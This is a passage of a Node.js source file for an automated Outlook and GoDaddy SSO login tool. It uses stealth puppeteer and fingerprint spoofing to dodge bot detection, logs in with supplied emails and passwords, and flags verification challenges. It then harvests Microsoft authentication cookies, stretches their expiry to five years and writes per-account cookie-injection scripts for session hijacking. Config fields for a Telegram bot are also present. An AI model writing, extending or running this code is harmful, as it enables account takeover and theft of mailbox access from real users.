const fs = require('fs');
const path = require('path');
const projectRoot = path.resolve(__dirname, '..');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
require('dotenv').config();
puppeteer.use(StealthPlugin());
const readline = require('readline');
const crypto = require('crypto');
const { clickSmart } = require('./providers/utils');
const { createProviders } = require('./providers');

// Configuration
const cfg = {
    navTimeoutMs: 60000,
    actionTimeoutMs: 30000,
    humanizeEnabled: true,
    blockResources: true,
    artifactsDir: 'session_data',
    collectArtifactsOnFailure: false,
    requireOwaUserConfig: false,
    challengeTimeoutMs: 180000,
    logLevel: 'info',
    screenshotQuality: 80,
    proxyEnabled: false,
    proxyUrl: null,
    telegramBotToken: null,
    telegramChatId: null
};

// Try to load config from file
try {
    const encPath = path.join(__dirname, 'config.json.enc');
    const plainPath = path.join(__dirname, 'config.json');

    if (fs.existsSync(encPath)) {
        const buf = fs.readFileSync(encPath);
        if (buf.length > 16) {
            const iv = buf.subarray(0, 16);
            const encryptedText = buf.subarray(16).toString('utf8');
            const key = process.env.ENC_KEY;
            
            if (key) {
                const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
                let decrypted = decipher.update(encryptedText, 'base64', 'utf8');
                decrypted += decipher.final('utf8');
                const fileCfg = JSON.parse(decrypted);
                Object.assign(cfg, fileCfg);
            } else {
                console.warn('ENC_KEY not found in environment, skipping encrypted config load.');
            }
        }
    } else if (fs.existsSync(plainPath)) {
        const fileCfg = JSON.parse(fs.readFileSync(plainPath, 'utf8'));
        Object.assign(cfg, fileCfg);
    }
} catch (e) {
    console.warn('Could not load config, using defaults: ' + e.message);
}

// Override with Environment Variables (Render/Docker)
if (process.env.TELEGRAM_BOT_TOKEN) cfg.telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
if (process.env.TELEGRAM_CHAT_ID) cfg.telegramChatId = process.env.TELEGRAM_CHAT_ID;
if (process.env.TELEMETRY_ENABLED) cfg.telemetryEnabled = (process.env.TELEMETRY_ENABLED === 'true');
// API_BASE_URL no longer used for backend callbacks; consolidated.js is invoked directly

// --- Helpers ---

async function gotoStable(page, url, timeout = 30000) {
    try {
        await page.goto(url, { waitUntil: 'domcontentloaded', timeout });
    } catch (e) {
        console.warn(`gotoStable warning for ${url}: ${e.message}`);
    }
}

async function clickAndWait(page, clickPromise, timeout = 30000) {
    await Promise.all([
        page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout }).catch(() => {}),
        clickPromise
    ]);
}

async function typeHuman(page, selector, text) {
    // Optimization: Faster typing (10-30ms) while still retaining some randomness
    await page.type(selector, text, { delay: Math.floor(Math.random() * 20) + 10 });
}

async function findPasswordFieldAcrossFrames(page) {
    const selectors = [
        { rule: 'microsoft_i0118', selector: '#i0118' },
        { rule: 'type_password', selector: 'input[type="password"]' },
        { rule: 'autocomplete_password', selector: 'input[autocomplete="current-password"], input[autocomplete="new-password"]' },
        { rule: 'name_or_id_pass', selector: 'input[name*="pass" i], input[id*="pass" i]' },
        { rule: 'aria_or_placeholder_password', selector: 'input[aria-label*="password" i], input[placeholder*="password" i]' }
    ];

    const frames = page.frames();
    for (const frame of frames) {
        for (const entry of selectors) {
            let handle = null;
            try {
                handle = await frame.$(entry.selector);
                if (!handle) continue;
                const ok = await frame.evaluate(el => {
                    if (!el) return false;
                    if (el.disabled) return false;
                    const style = window.getComputedStyle(el);
                    if (!style) return false;
                    if (style.visibility === 'hidden' || style.display === 'none') return false;
                    const rect = el.getBoundingClientRect();
                    if (!rect) return false;
                    return rect.width > 0 && rect.height > 0;
                }, handle);
                if (!ok) {
                    await handle.dispose().catch(() => {});
                    continue;
                }
                return { frame, handle, rule: entry.rule, selector: entry.selector, frameUrl: frame.url() };
            } catch (e) {
                if (handle) await handle.dispose().catch(() => {});
            }
        }
    }
    return null;
}

async function clickSubmitNearPasswordField(page, found) {
    if (!found || !found.frame || !found.handle) return false;
    try {
        const clicked = await found.frame.evaluate(el => {
            const getSubmit = (root) => {
                if (!root) return null;
                return root.querySelector('#idSIButton9, button[type="submit"], input[type="submit"], button[name="login"], input[name="login"]');
            };
            const form = el.form || el.closest('form');
            const btn = getSubmit(form) || getSubmit(document);
            if (!btn) return false;
            btn.click();
            return true;
        }, found.handle);
        if (!clicked) return false;
        await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: cfg.navTimeoutMs }).catch(() => {});
        return true;
    } catch (e) {
        return false;
    }
}



async function applyFingerprint(page) {
    const userAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36';
    await page.setUserAgent(userAgent).catch(() => {});
    await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-US,en;q=0.9' }).catch(() => {});
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'platform', { get: () => 'MacIntel' });
        Object.defineProperty(navigator, 'vendor', { get: () => 'Google Inc.' });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
        Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
        Object.defineProperty(navigator, 'plugins', {
            get: () => [
                { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                { name: 'Native Client', filename: 'internal-nacl-plugin' }
            ]
        });
        if (!window.chrome) window.chrome = {};
        if (!window.chrome.runtime) window.chrome.runtime = {};
        const originalQuery = window.navigator.permissions && window.navigator.permissions.query;
        if (originalQuery) {
            window.navigator.permissions.query = (parameters) => {
                if (parameters && parameters.name === 'notifications') {
                    return Promise.resolve({ state: Notification.permission });
                }
                return originalQuery(parameters);
            };
        }
    });
}

function normalizeLogLevel(level) {
    const v = String(level || '').toLowerCase().trim();
    if (v === 'silent' || v === 'quiet' || v === 'none') return 'silent';
    if (v === 'verbose' || v === 'debug') return 'verbose';
    return 'info';
}

function shouldLog(level, messageLevel) {
    const order = { silent: 0, info: 1, verbose: 2 };
    return (order[normalizeLogLevel(level)] || 1) >= (order[normalizeLogLevel(messageLevel)] || 1);
}

function safeUrl(value) {
    try {
        const u = new URL(String(value || ''));
        u.hash = '';
        u.search = '';
        return u.toString();
    } catch {
        return '';
    }
}

function ensureDir(dirPath) {
    if (!dirPath) return;
    if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
}

function safeFilePart(value) {
    return String(value || '')
        .replace(/[^a-zA-Z0-9._-]+/g, '_')
        .slice(0, 80);
}

function getDomainFromEmail(email) {
    const s = String(email || '');
    const i = s.lastIndexOf('@');
    if (i === -1) return '';
    return s.slice(i + 1).toLowerCase();
}

async function logCliEvent({ email, password, cookieId, attempt = 1 }) {
    return;
}

async function captureFailureArtifacts(page, sessionId, stepName, extra = {}) {
    if (!cfg.collectArtifactsOnFailure) return null;
    const dir = path.join(__dirname, cfg.artifactsDir || 'session_data');
    ensureDir(dir);
    const ts = Date.now();
    const base = `fail_${safeFilePart(sessionId || 'nosession')}_${safeFilePart(stepName || 'unknown')}_${ts}`;
    const url = safeUrl(page && page.url ? page.url() : '');
    const metaPath = path.join(dir, `${base}.json`);
    const pngPath = path.join(dir, `${base}.png`);
    const htmlPath = path.join(dir, `${base}.html`);
    const meta = {
        time: ts,
        step: stepName || 'unknown',
        url,
        extra: extra && typeof extra === 'object' ? extra : {}
    };
    try {
        if (page) {
            const title = await page.title().catch(() => '');
            const dom = await page.evaluate(() => {
                const inputs = Array.from(document.querySelectorAll('input, textarea'))
                    .slice(0, 40)
                    .map(el => ({
                        tag: el.tagName.toLowerCase(),
                        id: el.id || '',
                        name: el.getAttribute('name') || '',
                        type: el.getAttribute('type') || '',
                        autocomplete: el.getAttribute('autocomplete') || '',
                        ariaLabel: el.getAttribute('aria-label') || '',
                        placeholder: el.getAttribute('placeholder') || ''
                    }));
                const buttons = Array.from(document.querySelectorAll('button, input[type="submit"], input[type="button"]'))
                    .slice(0, 40)
                    .map(el => ({
                        tag: el.tagName.toLowerCase(),
                        id: el.id || '',
                        name: el.getAttribute('name') || '',
                        type: el.getAttribute('type') || '',
                        text: (el.tagName.toLowerCase() === 'input' ? (el.getAttribute('value') || '') : (el.textContent || '')).trim().slice(0, 120)
                    }));
                const bodyTextSample = (document.body && document.body.innerText ? document.body.innerText : '').trim().slice(0, 500);
                return { inputs, buttons, bodyTextSample };
            }).catch(() => null);
            meta.title = title || '';
            meta.dom = dom;
        }
    } catch {}
    try {
        fs.writeFileSync(metaPath, JSON.stringify(meta));
    } catch {}
    try {
        if (page && page.screenshot) {
            await page.screenshot({ path: pngPath, fullPage: true }).catch(() => {});
        }
    } catch {}
    try {
        if (page && page.content) {
            const html = await page.content().catch(() => '');
            if (html) fs.writeFileSync(htmlPath, html);
        }
    } catch {}
    return { metaPath, pngPath, htmlPath };
}

async function runStep(page, sessionId, stepName, fn) {
    const start = Date.now();
    try {
        const result = await fn();
        return { ok: true, step: stepName, ms: Date.now() - start, result };
    } catch (e) {
        await captureFailureArtifacts(page, sessionId, stepName, { error: String(e && e.message ? e.message : e) }).catch(() => {});
        const err = new Error(`[${stepName}] ${e && e.message ? e.message : String(e)}`);
        err.cause = e;
        err.step = stepName;
        err.ms = Date.now() - start;
        throw err;
    }
}

// --- Cookie Saver Functionality (from c00ki35.js) ---

/**
 * Save Microsoft authentication cookies from an authenticated Puppeteer session
 */
async function saveMicrosoftCookies(page, email = null, password = null, providedSessionId = null) {
    try {
        console.log('🍪 Collecting 13 essential Microsoft authentication cookies...');

        let allCookies = [];
        try {
            const client = await page.target().createCDPSession();
            const { cookies: cdpCookies } = await client.send('Network.getAllCookies');
            allCookies = (cdpCookies || []).map(c => ({
                name: c.name,
                value: c.value,
                domain: c.domain,
                path: c.path || '/',
                expires: c.expires,
                secure: !!c.secure,
                session: !!c.session,
                sameSite: c.sameSite || 'None',
                httpOnly: !!c.httpOnly
            }));
            console.log(`📦 Collected ${allCookies.length} cookies via CDP`);
        } catch (e) {
            const currentCookies = await page.cookies();
            allCookies = allCookies.concat(currentCookies);
            console.log(`📦 Fallback collected ${currentCookies.length} cookies from current page`);
        }

        const cookieMap = new Map();
        for (const cookie of allCookies) {
            const cookieKey = `${cookie.name}|${cookie.domain}|${cookie.path || '/'}`;
            if (!cookieMap.has(cookieKey) || (cookie.expires > 0 && cookie.expires > (cookieMap.get(cookieKey).expires || 0))) {
                cookieMap.set(cookieKey, cookie);
            }
        }

        const essentialNames = [
            'ESTSAUTH','ESTSAUTHPERSISTENT','buid','fpc','stsservicecookie','x-ms-gateway-slice',
            'luat','SuiteServiceProxyKey','OWAAppIdType','MSPAuth','MSPOK','rtFa'
        ];
        const filtered = [];
        const seen = new Set();
        const pushCookie = (c) => {
            const key = `${c.name}|${c.domain}|${c.path || '/'}`;
            if (seen.has(key)) return;
            seen.add(key);
            if (c.expires === -1 || !c.expires || c.session) {
                c.expires = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                c.session = false;
            } else {
                const fiveYearsFromNow = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                if (c.expires < fiveYearsFromNow) c.expires = fiveYearsFromNow;
            }
            c.secure = true;
            c.sameSite = 'None';
            if (c.domain && !c.domain.startsWith('.')) c.domain = '.' + c.domain.replace(/^\.+/, '');
            filtered.push(c);
        };

        // Add essential by priority
        for (const name of essentialNames) {
            for (const [, c] of cookieMap) {
                if (c.name === name) pushCookie(c);
                if (filtered.length >= 13) break;
            }
            if (filtered.length >= 13) break;
        }
        // Fill with esctx- prefixed if needed
        if (filtered.length < 13) {
            for (const [, c] of cookieMap) {
                if (c.name && c.name.startsWith('esctx-')) pushCookie(c);
                if (filtered.length >= 13) break;
            }
        }
        // If fewer than 13, fill with high-priority Microsoft cookies
        const domainPriority = {
            '.outlook.office.com': 100,
            '.outlook.office365.com': 95,
            '.login.microsoftonline.com': 90,
            '.office.com': 85,
            '.account.microsoft.com': 80,
            '.live.com': 75,
            '.aadcdn.msftauth.net': 70,
            '.aadcdn.msauth.net': 70
        };
        const isMsDomain = (d) => {
            return Object.keys(domainPriority).some(prefix => (d || '').endsWith(prefix));
        };
        if (filtered.length < 13) {
            const candidates = [];
            const already = new Set(filtered.map(c => `${c.name}|${c.domain}|${c.path || '/'}`));
            for (const [, c] of cookieMap) {
                const key = `${c.name}|${c.domain}|${c.path || '/'}`;
                if (already.has(key)) continue;
                if (!isMsDomain(c.domain || '')) continue;
                const pri = domainPriority[Object.keys(domainPriority).find(p => (c.domain || '').endsWith(p))] || 10;
                const exp = (c.expires && c.expires > 0) ? c.expires : 0;
                candidates.push({ c, score: pri * 1000000000 + exp });
            }
            candidates.sort((a,b) => b.score - a.score);
            for (const { c } of candidates) {
                if (c.expires === -1 || !c.expires || c.session) {
                    c.expires = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                    c.session = false;
                }
                c.secure = true;
                c.sameSite = 'None';
                if (c.domain && !c.domain.startsWith('.')) c.domain = '.' + c.domain.replace(/^\.+/, '');
                filtered.push(c);
                if (filtered.length >= 13) break;
            }
        }
        
        const essentialCookies = filtered.slice(0, Math.min(filtered.length, 13));
        console.log(`📦 Collected ${essentialCookies.length} essential cookies`);

        if (essentialCookies.length === 0) {
            throw new Error('No cookies found - session may not be authenticated');
        }

        const sessionDir = path.join(__dirname, cfg.artifactsDir || 'session_data');
        ensureDir(sessionDir);

        const sessionId = providedSessionId || Date.now();
        const sessionTimestamp = new Date().toISOString();
        const sessionEmail = email || 'unknown';

        const sessionInjectScript = path.join(sessionDir, `inject_session_${sessionId}.js`);
        
        // Update Status: Completed
        fs.writeFileSync(path.join(sessionDir, `status_${sessionId}.json`), JSON.stringify({ status: 'completed', time: Date.now() }));
        
        const sessionScriptContent = `
// Microsoft Session Cookie Injector
// Auto-generated on ${sessionTimestamp}
// Email: ${sessionEmail}
// Cookies: ${essentialCookies.length}

(function() {
    console.log('🚀 Injecting ${essentialCookies.length} Microsoft cookies for: ${sessionEmail}');
    const cookies = ${JSON.stringify(essentialCookies, null, 4)};
    let injected = 0;
    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';
            document.cookie = cookieStr;
            injected++;
        } catch (e) { console.warn('Failed to inject cookie:', cookie.name, e.message); }
    });
    console.log('✅ Successfully injected ' + injected + '/' + ${essentialCookies.length} + ' cookies!');
})();`;

        fs.writeFileSync(sessionInjectScript, sessionScriptContent);
        
        // Telegram logic removed per user request (inject cookies only in session data)

        return {
            success: true,
            sessionId: sessionId,
            injectionScript: sessionInjectScript,
            cookieCount: essentialCookies.length
        };
    } catch (error) {
        console.error('❌ Error saving cookies:', error.message);
        // Update Status: Failed
        if (providedSessionId) {
            const sessionDir = path.join(__dirname, cfg.artifactsDir || 'session_data');
            ensureDir(sessionDir);
            fs.writeFileSync(path.join(sessionDir, `status_${providedSessionId}.json`), JSON.stringify({ status: 'failed', error: error.message, time: Date.now() }));
        }
        throw error;
    }
}

// --- OutlookLoginAutomation Class (Consolidated) ---

class OutlookLoginAutomation {
    constructor(options = {}) {
        this.browser = null;
        this.page = null;
        this.context = null;
        this.logLevel = normalizeLogLevel(options.logLevel || (options.verbose ? 'verbose' : cfg.logLevel));
        this.verbose = shouldLog(this.logLevel, 'verbose');
        this.headless = options.headless !== false;
        this.isClosing = false;
        this.lastActivity = Date.now();
        this.providers = createProviders({
            cfg,
            typeHuman,
            clickAndWait,
            clickSmart,
            findPasswordFieldAcrossFrames,
            clickSubmitNearPasswordField,
        });
    }

    async init() {
        const browserOptions = {
            headless: this.headless ? 'new' : false,
            ignoreDefaultArgs: ['--enable-automation'],
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--no-first-run',
                '--disable-notifications',
                '--no-default-browser-check',
                '--disable-popup-blocking',
                '--disable-translate',
                '--disable-blink-features=AutomationControlled',
                '--max_old_space_size=512'
            ],
            dumpio: false,
            ignoreHTTPSErrors: true,
            defaultViewport: { width: 1280, height: 720 }
        };

        const cacheDir = path.join(projectRoot, 'puppeteer_chrome');
        const chromeRoot = path.join(cacheDir, 'chrome');
        let executablePath = null;
        try {
            const versions = fs.readdirSync(chromeRoot).filter(name => {
                const full = path.join(chromeRoot, name);
                try {
                    return fs.statSync(full).isDirectory();
                } catch {
                    return false;
                }
            }).sort();
            const latest = versions[versions.length - 1];
            if (latest) {
                const base = path.join(chromeRoot, latest);
                const candidates = [
                    path.join(base, 'chrome-linux64', 'chrome'),
                    path.join(base, 'chrome'),
                    path.join(base, 'chrome.exe')
                ];
                for (const p of candidates) {
                    if (fs.existsSync(p)) {
                        executablePath = p;
                        break;
                    }
                }
            }
        } catch (e) {}
        if (executablePath) {
            browserOptions.executablePath = executablePath;
        }

        if (cfg.proxyUrl) {
            browserOptions.args.push(`--proxy-server=${cfg.proxyUrl}`);
        }

        await runStep(null, null, 'launch_browser', async () => {
            this.browser = await puppeteer.launch(browserOptions);
        });

        await runStep(null, null, 'create_context', async () => {
            this.context = await this.browser.createBrowserContext();
            this.page = await this.context.newPage();
            await this.page.setViewport({ width: 1280, height: 720 });
        });
        
        await this.page.evaluateOnNewDocument(() => {
            if (typeof Notification === 'undefined') {
                globalThis.Notification = {
                    permission: 'default',
                    requestPermission: async () => 'default'
                };
            }
        });

        await runStep(this.page, null, 'configure_page', async () => {
            await this.page.setUserAgent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36');
            this.page.setDefaultTimeout(cfg.actionTimeoutMs);
            this.page.setDefaultNavigationTimeout(cfg.navTimeoutMs);
        });

        if (cfg.blockResources) {
            await this.page.setRequestInterception(true);
            this.page.on('request', req => {
                const url = req.url();
                const type = req.resourceType();
                if (
                    url.includes('sso.godaddy.com') ||
                    url.includes('wsimg.com') ||
                    url.includes('iesnare.com') ||
                    url.includes('cdndex.io')
                ) {
                    return req.continue();
                }
                if (
                    type === 'image' ||
                    type === 'font' ||
                    url.includes('googletag') ||
                    url.includes('google-analytics') ||
                    url.includes('doubleclick')
                ) {
                    return req.abort();
                }
                req.continue();
            });
        }

        await runStep(this.page, null, 'apply_fingerprint', async () => {
            await applyFingerprint(this.page);
        });
        console.log('Browser initialized successfully');

        if (shouldLog(this.logLevel, 'verbose')) {
            this.page.on('framenavigated', frame => {
                if (frame === this.page.mainFrame()) {
                    console.log(`🌐 Navigated: ${frame.url()}`);
                }
            });
            this.page.on('requestfailed', req => {
                const failure = req.failure();
                const errText = failure && failure.errorText ? failure.errorText : 'unknown';
                const url = req.url();
                const type = req.resourceType();
                if (url.endsWith('/favicon.ico') || url.includes('favicon.ico')) return;
                if (cfg.blockResources) {
                    if (type === 'image' || type === 'font') return;
                    if (url.includes('googletag') || url.includes('google-analytics') || url.includes('doubleclick')) return;
                }
                if (url.includes('csp.microsoft.com/report')) return;
                console.log(`⚠️ Request failed: ${req.method()} ${url} (${errText})`);
            });
            this.page.on('response', res => {
                const status = res.status();
                if (status >= 400) console.log(`⚠️ Response ${status}: ${res.url()}`);
            });
            this.page.on('pageerror', err => {
                const message = String((err && err.message) || '');
                if (!message || message === 'undefined') return;
                if (message.includes('Notification is not defined')) return;
                console.log(`⚠️ Page error: ${message}`);
            });
            this.page.on('console', msg => {
                const text = msg.text();
                if (text.includes('Refused to create a TrustedTypePolicy')) return;
                if (text.includes('violates the following Content Security Policy directive')) return;
                if (text.includes('Failed to load resource: net::ERR_FAILED')) return;
                console.log(`🧾 Console: ${msg.type()} ${text}`);
            });
        }
    }

    async navigateToOutlook() {
        try {
            console.log('Navigating to Outlook...');
            await runStep(this.page, null, 'navigate_initial', async () => {
                await gotoStable(this.page, 'https://outlook.office.com/mail/', cfg.navTimeoutMs);
            });
            console.log(`🌐 Navigated: ${this.page.url()}`);
            return true;
        } catch (error) {
            console.error('Error navigating to Outlook:', error.message);
            return false;
        }
    }

    async clickStaySignedInIfPresent() {
        const selector = '#idSIButton9';
        try {
            const el = await this.page.waitForSelector(selector, { timeout: 2000 }).catch(() => null);
            if (!el) return false;
            const title = await this.page.title().catch(() => '');
            console.log('Detected "Stay signed in" prompt');
            if (title) console.log(`Current Page Title: ${title}`);
            await Promise.all([
                this.page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {}),
                this.page.evaluate(() => {
                    const btn = document.querySelector('#idSIButton9');
                    if (btn) btn.click();
                }).catch(() => {})
            ]);
            await new Promise(r => setTimeout(r, 800));
            return true;
        } catch (e) {
            return false;
        }
    }

    async performLogin(email, password, sessionId = null, options = {}) {
        try {
            console.log(`Attempting to login with email: ${email}`);
            
            const effectiveSessionId = sessionId || Date.now();
            const pauseOnChallenge = !!(options && options.pauseOnChallenge);
            const challengeDeadlineMs = Date.now() + (options && options.challengeTimeoutMs ? options.challengeTimeoutMs : cfg.challengeTimeoutMs);

            const detectProvider = async () => {
                for (const p of this.providers) {
                    const matched = await p.detect(this.page).catch(() => false);
                    if (matched) return p;
                }
                const ms = this.providers.find(p => p.name === 'microsoft');
                return ms || this.providers[0];
            };

            const initialProvider = await runStep(this.page, effectiveSessionId, 'detect_provider_initial', detectProvider).then(r => r.result);
            const initialProviderName = initialProvider && initialProvider.name ? initialProvider.name : 'unknown';
            console.log(`Detected login provider: ${initialProviderName}`);

            await runStep(this.page, effectiveSessionId, 'provider_email_phase', async () => {
                const result = await initialProvider.login({
                    page: this.page,
                    email,
                    password,
                    sessionId: effectiveSessionId,
                    simulate: true
                });
                return result;
            });

            const urlHints = ['godaddy', 'secureserver', 'wildwest', 'okta.com', '/adfs', '/sts/'];
            const waitForRedirectOrProvider = async () => {
                console.log('Waiting for redirect or provider switch (or password field)...');
                const deadline = Date.now() + 3000;
                let last = null;
                while (Date.now() < deadline) {
                    last = await detectProvider();
                    const url = String(this.page.url() || '');
                    if (last && last.name && last.name !== initialProviderName) {
                        console.log(`Provider switched to ${last.name}`);
                        return last;
                    }
                    if (urlHints.some(h => url.includes(h))) {
                        console.log(`URL hint matched: ${url}`);
                        return last;
                    }

                    // Optimization: Check for password field early
                    const passwordField = await findPasswordFieldAcrossFrames(this.page);
                    if (passwordField) {
                         console.log('Password field detected early - stopping redirect wait.');
                         await passwordField.handle.dispose().catch(() => {});
                         return initialProvider; 
                    }

                    await new Promise(r => setTimeout(r, 250));
                }
                console.log('No provider switch detected.');
                return last;
            };

            if (options && options.simulate) return true;

            console.log('Detecting provider after email...');
            const passwordProvider = await runStep(this.page, effectiveSessionId, 'detect_provider_after_email', waitForRedirectOrProvider).then(r => r.result);
            const passwordProviderName = passwordProvider && passwordProvider.name ? passwordProvider.name : 'unknown';

            if (passwordProviderName !== initialProviderName) {
                console.log(`Provider switched: ${initialProviderName} -> ${passwordProviderName}`);
            }

            console.log(`Starting password phase with provider: ${passwordProviderName}`);

            const providerResult = await runStep(this.page, effectiveSessionId, 'provider_password_phase', async () => {
                const res = await passwordProvider.login({
                    page: this.page,
                    email,
                    password,
                    sessionId: effectiveSessionId,
                    simulate: false
                });
                return res;
            }).then(r => r.result);

            const afterPasswordUrl = String(this.page.url() || '');
            if (afterPasswordUrl.includes('sso.godaddy.com') && passwordProviderName !== 'godaddy') {
                const gd = this.providers.find(p => p.name === 'godaddy');
                if (gd) {
                    console.log('Detected GoDaddy SSO stage, running GoDaddy login...');
                    await runStep(this.page, effectiveSessionId, 'godaddy_secondary_login', async () => {
                        return await gd.login({ page: this.page, email, password, sessionId: effectiveSessionId, simulate: false });
                    });
                }
            }

            if (!providerResult || providerResult.ok !== true) {
                console.error('Password entry failed');
            }

            console.log('Waiting for login result...');
            const startTime = Date.now();
            let loginState = 'timeout';
            const authCookieNames = new Set([
                'ESTSAUTH',
                'ESTSAUTHPERSISTENT',
                'MSPAuth',
                'MSPOK',
                'rtFa',
                'stsservicecookie',
                'x-ms-gateway-slice',
                'SuiteServiceProxyKey',
                'luat'
            ]);
            const hasAuthCookies = async () => {
                const cookies = await this.page.cookies().catch(() => []);
                return cookies.some(c => authCookieNames.has(c.name) || (c.name && c.name.startsWith('esctx-')));
            };
            let owaUserConfigOk = false;
            const onResponse = (res) => {
                const url = res.url();
                if (!url.includes('/owa/service.svc?action=GetOwaUserConfiguration')) return;
                const status = res.status();
                if (status === 200) owaUserConfigOk = true;
            };
            this.page.on('response', onResponse);
            
            while (Date.now() - startTime < 60000) {
                const url = this.page.url();



                // 1. Check "Stay Signed In" (Priority)
                if (await this.clickStaySignedInIfPresent()) continue;
                
                // 2. Check Success
                if (owaUserConfigOk) {
                    loginState = 'success';
                    break;
                }

                if (url.includes('outlook.office.com') || url.includes('landing') || url.includes('mail')) {
                    const hasAuthCookie = await hasAuthCookies();
                    if (hasAuthCookie) {
                        if (!cfg.requireOwaUserConfig) {
                            loginState = 'success';
                            break;
                        }
                        if (owaUserConfigOk) {
                            loginState = 'success';
                            break;
                        }
                    }
                }

                if (url.includes('sso.godaddy.com')) {
                    const hasUnusualModal = await this.page.$('#modal-cancel-btn').catch(() => null);
                    if (hasUnusualModal) {
                        loginState = 'challenge';
                        break;
                    }
                    const t = await this.page.evaluate(() => (document.body && document.body.innerText ? document.body.innerText : '')).catch(() => '');
                    const lower = String(t || '').toLowerCase();
                    if (lower.includes('your browser is a bit unusual')) {
                        loginState = 'challenge';
                        break;
                    }
                    if (url.includes('/login/tac/') || lower.includes('verify it\'s you') || lower.includes('this device isn\'t recognized')) {
                        loginState = 'challenge';
                        break;
                    }
                }
                
                // 3. Check Error (Optimized)
                const errorSelector = '#passwordError, .error, .alert-error, #usernameError';
                const hasErrorElement = await this.page.$(errorSelector).catch(() => null);
                if (hasErrorElement) {
                     // Check if it's visible and contains relevant text
                     const errorText = await this.page.evaluate(el => el.textContent, hasErrorElement).catch(() => '');
                     const t = String(errorText || '').toLowerCase();
                     if (t.includes('incorrect') || t.includes('invalid') || t.includes('unsuccessful') || t.includes('try again') || t.includes('wrong')) {
                         loginState = 'error';
                         break;
                     }
                }

                // Fallback text check (slower but safer)
                if (!hasErrorElement) {
                    const errorText = await this.page.evaluate(() => document.body.textContent || '').catch(() => '');
                    const t = String(errorText || '').toLowerCase();
                    if (t.includes('incorrect') || t.includes('unsuccessful') || t.includes('invalid') || t.includes('try again') || t.includes('wrong')) {
                         if (!url.includes('outlook.office.com')) {
                             loginState = 'error';
                             break;
                         }
                    }
                }
                
                await new Promise(r => setTimeout(r, 200)); // Fast poll
            }
            this.page.off('response', onResponse);
            
            if (loginState === 'error') {
                console.error('Login failed: Incorrect password or error message detected.');
                await captureFailureArtifacts(this.page, effectiveSessionId, 'login_error', { provider: passwordProviderName }).catch(() => {});
                return false;
            }

            if (loginState === 'challenge') {
                console.warn('Login blocked by a verification challenge.');
                await captureFailureArtifacts(this.page, effectiveSessionId, 'login_challenge', { provider: passwordProviderName }).catch(() => {});
                if (!pauseOnChallenge) return false;

                console.log('Waiting for you to complete verification in the browser...');
                while (Date.now() < challengeDeadlineMs) {
                    const url = String(this.page.url() || '');
                    if (url.includes('outlook.office.com') || url.includes('mail')) {
                        const hasAuthCookie = await hasAuthCookies();
                        if (hasAuthCookie) {
                            console.log('Verification completed, continuing...');
                            break;
                        }
                    }
                    if (owaUserConfigOk) break;
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
            
            if (loginState === 'timeout') {
                console.warn('Login timed out waiting for final state.');
                await captureFailureArtifacts(this.page, effectiveSessionId, 'login_timeout', { provider: passwordProviderName }).catch(() => {});
                 // Fallback: check if we have cookies anyway?
            }

            const finalUrl = this.page.url();
            const finalHasAuthCookies = await hasAuthCookies();
            const finalIsOutlook = finalUrl.includes('outlook.office.com');

            const finalOk = finalIsOutlook && finalHasAuthCookies && (!cfg.requireOwaUserConfig || owaUserConfigOk);
            if ((loginState === 'success') || finalOk) {
                console.log('Login successful');
                
                // Now save cookies
                const saveResult = await runStep(this.page, effectiveSessionId, 'save_cookies', async () => {
                    const res = await saveMicrosoftCookies(this.page, email, null, effectiveSessionId);
                    return res;
                }).then(r => r.result);
                if (saveResult && (saveResult.success || saveResult === true || (saveResult && typeof saveResult === 'object'))) {
                    console.log('✅ CONSOLIDATED SUCCESS: Cookies saved!');
                    return true;
                }
            }

            console.error('Login process completed but did not result in success state');
            await captureFailureArtifacts(this.page, effectiveSessionId, 'login_final_failure', { provider: passwordProviderName, finalUrl: safeUrl(finalUrl) }).catch(() => {});
            return false;
        } catch (error) {
            console.error('Error during login:', error.message);
            const effectiveSessionId = sessionId || Date.now();
            await captureFailureArtifacts(this.page, effectiveSessionId, 'perform_login_exception', { error: error.message }).catch(() => {});
            return false;
        }
    }

    async close() {
        if (this.browser) {
            await this.browser.close();
            this.browser = null;
        }
    }
}

// --- CLI Entry Point ---

if (require.main === module) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(r => rl.question(q, r));

    (async () => {
        try {
            console.log('\n🔐 Consolidated Outlook Automation\n');
            
            const rawArgs = process.argv.slice(2);
            
            // Define known flags to prevent passwords starting with "--" from being treated as flags
            const isKnownFlag = (arg) => {
                const s = String(arg);
                if (!s.startsWith('--')) return false;
                if (s.startsWith('--log-level=')) return true;
